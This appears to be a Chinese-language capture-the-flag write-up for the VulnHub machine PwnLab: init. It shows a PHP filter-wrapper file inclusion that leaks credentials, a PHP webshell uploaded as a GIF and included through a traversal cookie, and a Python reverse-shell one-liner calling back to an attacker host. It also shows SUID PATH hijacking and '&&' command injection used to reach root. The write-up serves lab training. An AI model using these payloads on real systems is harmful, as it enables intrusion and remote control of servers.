# PwnLab: init

https://www.vulnhub.com/entry/pwnlab-init,158/

difficulty: Low

Finish Date：2024-4-19

## IP

192.168.10.169

## Scan

Open Port -> 80,111,3306,48298

```
PORT      STATE SERVICE VERSION
80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
|_http-title: PwnLab Intranet Image Hosting
|_http-server-header: Apache/2.4.10 (Debian)
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          34809/udp6  status
|   100024  1          45040/tcp6  status
|   100024  1          48298/tcp   status
|_  100024  1          55905/udp   status
3306/tcp  open  mysql   MySQL 5.5.47-0+deb8u1
| mysql-info:
|   Protocol: 10
|   Version: 5.5.47-0+deb8u1
|   Thread ID: 48
|   Capabilities flags: 63487
|   Some Capabilities: LongPassword, FoundRows, Support41Auth, ODBCClient, InteractiveClient, ConnectWithDatabase, IgnoreSigpipes, SupportsTransactions, LongColumnFlag, Speaks41ProtocolOld, IgnoreSpaceBeforeParenthesis, DontAllowDatabaseTableColumn, Speaks41ProtocolNew, SupportsCompression, SupportsLoadDataLocal, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
|   Status: Autocommit
|   Salt: }Rbs?|tRz3.*),BH#r8]
|_  Auth Plugin Name: mysql_native_password
48298/tcp open  status  1 (RPC #100024)
```

目录扫描存在以下 2 个目录：http://192.168.10.169/upload/ 和 http://192.168.10.169/images/

访问 80 web 服务：http://192.168.10.169/，根据页面上的功能，思路可能是上传后门，然后反弹shell，但是需要先登陆，找到用户凭证，尝试使用sqlmap没有跑出注入点。

在看 url 上的参数 http://192.168.10.169/?page=login 可能存在文件包含漏洞，使用 nikto 扫描出跟目录下还有一个 config.php，尝试使用 php 包装器看看能不能把 login 和 config 这 2 个文件读出来。

http://192.168.10.169/?page=php://filter/read=convert.base64-encode/resource=login 得到的内容使用 base64 解码，我们看到了源码，其中还有一个 config 文件：

```php
<?php
session_start();
require("config.php");
$mysqli = new mysqli($server, $username, $password, $database);

if (isset($_POST['user']) and isset($_POST['pass']))
{
	$luser = $_POST['user'];
	$lpass = base64_encode($_POST['pass']);

	$stmt = $mysqli->prepare("SELECT * FROM users WHERE user=? AND pass=?");
	$stmt->bind_param('ss', $luser, $lpass);

	$stmt->execute();
	$stmt->store_Result();

	if ($stmt->num_rows == 1)
	{
		$_SESSION['user'] = $luser;
		header('Location: ?page=upload');
	}
	else
	{
		echo "Login failed.";
	}
}
else
{
	?>
	<form action="" method="POST">
	<label>Username: </label><input id="user" type="test" name="user"><br />
	<label>Password: </label><input id="pass" type="password" name="pass"><br />
	<input type="submit" name="submit" value="Login">
	</form>
	<?php
}
```

http://192.168.10.169/?page=php://filter/read=convert.base64-encode/resource=config

```php
<?php
$server	  = "localhost";
$username = "root";
$password = "H4u%QJ_H99";
$database = "Users";
?>
```

http://192.168.10.169/?page=php://filter/read=convert.base64-encode/resource=index

```php
<?php
//Multilingual. Not implemented yet.
//setcookie("lang","en.lang.php");
if (isset($_COOKIE['lang']))
{
	include("lang/".$_COOKIE['lang']);
}
// Not implemented yet.
?>
<html>
<head>
<title>PwnLab Intranet Image Hosting</title>
</head>
<body>
<center>
<img src="images/pwnlab.png"><br />
[ <a href="/">Home</a> ] [ <a href="?page=login">Login</a> ] [ <a href="?page=upload">Upload</a> ]
<hr/><br/>
<?php
	if (isset($_GET['page']))
	{
		include($_GET['page'].".php");
	}
	else
	{
		echo "Use this server to upload and share image files inside the intranet";
	}
?>
</center>
</body>
</html>
```

使用得到的用户口令，远程登陆 mysql 数据库：
mysql -h 192.168.10.169 -u root -pH4u%QJ_H99

查询 Uses.user 表得到了用户名和密码：

```
------+------------------+
| user | pass             |
+------+------------------+
| kent | Sld6WHVCSkpOeQ== |   <-- JWzXuBJJNy
| mike | U0lmZHNURW42SQ== |   <-- SIfdsTEn6I
| kane | aVN2NVltMkdSbw== |   <-- iSv5Ym2GRo
+------+------------------+
```

使用上面得到的用户凭证登陆后台，登陆后能看到 upload 功能，先让我们看看 upload 的源代码是什么，是否有上传文件类型检测。

```php
<?php
session_start();
if (!isset($_SESSION['user'])) { die('You must be log in.'); }
?>
<html>
	<body>
		<form action='' method='post' enctype='multipart/form-data'>
			<input type='file' name='file' id='file' />
			<input type='submit' name='submit' value='Upload'/>
		</form>
	</body>
</html>
<?php
if(isset($_POST['submit'])) {
	if ($_FILES['file']['error'] <= 0) {
		$filename  = $_FILES['file']['name'];
		$filetype  = $_FILES['file']['type'];
		$uploaddir = 'upload/';
		$file_ext  = strrchr($filename, '.');
		$imageinfo = getimagesize($_FILES['file']['tmp_name']);
		$whitelist = array(".jpg",".jpeg",".gif",".png");

		if (!(in_array($file_ext, $whitelist))) {
			die('Not allowed extension, please upload images only.');
		}

		if(strpos($filetype,'image') === false) {
			die('Error 001');
		}

		if($imageinfo['mime'] != 'image/gif' && $imageinfo['mime'] != 'image/jpeg' && $imageinfo['mime'] != 'image/jpg'&& $imageinfo['mime'] != 'image/png') {
			die('Error 002');
		}

		if(substr_count($filetype, '/')>1){
			die('Error 003');
		}

		$uploadfile = $uploaddir . md5(basename($_FILES['file']['name'])).$file_ext;

		if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)) {
			echo "<img src=\"".$uploadfile."\"><br />";
		} else {
			die('Error 4');
		}
	}
}
?>
```

可以看到这里上传功能中对文件后缀名、文件类型、文件名中不能包含/等都进行了限制，需要我们进行多种绕过，经过尝试发现无法进行绕过。

使用文件包含的话，这里的代码 `include($_GET['page'].".php");` 最后添加了.php 也无法进行绕过。再次看 index 中的代码，最上面还有一段 `include("lang/".$_COOKIE['lang']);` ，这个包含没有加最后的.php，我们可以进行利用，在 cookie 中设置目录穿越的文件名。

```
<?php system($_GET['cmd']);?>   上传名为shell.gif的后门代码

GET /?page=login&cmd=python%20-c%20'import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22192.168.10.3%22,8888));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import%20pty;%20pty.spawn(%22sh%22)'

Cookie: PHPSESSID=t6p7tsqu69clp6agbm5mcq0p74;lang=../upload/f3035846cc279a1aff73b7c2c25367b9.gif
```

在 kali 上进行监听，我们得到了反弹的 shell，先升级下 tty：python -c 'import pty; pty.spawn("/bin/bash")'

查看下 /home 目录，看看有哪些用户：john、mike、kane、kent，尝试用上面数据库中得到的密码，看是否能切换到对应用户，结果发现 kent 和 kane 用户能切换。

在 kane 中的 home 目录中，发现了一个 suid 文件：msgmike，尝试执行下，看看什么效果，文件访问了 mike 目录下的一个文件，但是现在 mike 的密码我们没有，不能切换。但是我们发现这个 cat 命令没有使用完整路径，这就可以给我们进行利用：

```
kane@pwnlab:~$ ./msgmike
./msgmike
cat: /home/mike/msg.txt: No such file or directory
```

在当前目录下，建立 cat，内容为：

```
echo 'chmod 777 /home/mike' > cat
chmod +x cat
export PATH=.:$PATH
./msgmike
```

我们就能访问 /home/mike 文件夹了，在该文件夹下发现了另外一个 suid 程序 msg2root，使用 strings 查看程序中的字符串：

```
Message for root:
/bin/echo %s >> /root/messages.txt
```

## falg

这里可以用 2 段输入参数，来执行我们的特殊命令：

```
123 && ls -al /root

123 && /bin/cat /root/flag.txt

.-=~=-.                                                                 .-=~=-.
(__  _)-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-(__  _)
(_ ___)  _____                             _                            (_ ___)
(__  _) /  __ \                           | |                           (__  _)
( _ __) | /  \/ ___  _ __   __ _ _ __ __ _| |_ ___                      ( _ __)
(__  _) | |    / _ \| '_ \ / _` | '__/ _` | __/ __|                     (__  _)
(_ ___) | \__/\ (_) | | | | (_| | | | (_| | |_\__ \                     (_ ___)
(__  _)  \____/\___/|_| |_|\__, |_|  \__,_|\__|___/                     (__  _)
( _ __)                     __/ |                                       ( _ __)
(__  _)                    |___/                                        (__  _)
(__  _)                                                                 (__  _)
(_ ___) If  you are  reading this,  means  that you have  break 'init'  (_ ___)
( _ __) Pwnlab.  I hope  you enjoyed  and thanks  for  your time doing  ( _ __)
(__  _) this challenge.                                                 (__  _)
(_ ___)                                                                 (_ ___)
( _ __) Please send me  your  feedback or your  writeup,  I will  love  ( _ __)
(__  _) reading it                                                      (__  _)
(__  _)                                                                 (__  _)
(__  _)                                             For sniferl4bs.com  (__  _)
( _ __)                                claor@PwnLab.net - @Chronicoder  ( _ __)
(__  _)                                                                 (__  _)
(_ ___)-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-(_ ___)
`-._.-'                                                                 `-._.-'
```
